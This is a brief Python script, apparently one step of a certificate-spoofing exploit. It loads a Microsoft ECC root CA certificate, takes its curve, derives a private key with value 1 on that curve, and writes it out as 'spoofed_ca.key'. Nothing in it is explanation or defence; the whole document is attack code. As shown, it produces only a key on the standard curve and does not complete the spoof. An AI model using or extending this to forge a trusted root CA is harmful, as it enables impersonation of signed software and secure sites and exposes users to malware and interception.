from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ec import derive_private_key
from cryptography.hazmat.primitives.serialization import Encoding 
from cryptography.hazmat.primitives.serialization import PublicFormat 
with open('/root/MicrosoftECCProductRootCertificateAuthority.cer', 'rb') as f:
    raw_cert = f.read()
cert       = x509.load_pem_x509_certificate(raw_cert, default_backend())
public_key = cert.public_key()
# print(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))
# b'-----BEGIN PUBLIC KEY-----\nMHYwEAYHKoZIzj0CAQYFK4EEACIDYgAExxEWKnYdVo6+uWJl1MPOtPDDMOyPbddu\nObzISauruONDeNWBBl3vx32fztazkHXeDLCQ3iO6yNE+Z+AZqRuGMR5fNC3uF/0V\n+34nijKh6smPyX4Yyy87LEh6fab0AQes\n-----END PUBLIC KEY-----\n'
curve      = public_key.curve
private_value = 1
private_key   = derive_private_key(private_value, curve, default_backend())

pem = private_key.private_bytes(
    encoding             = serialization.Encoding.PEM,
    format               = serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm = serialization.NoEncryption()
)
with open('spoofed_ca.key', 'wb') as f:
    f.write(pem)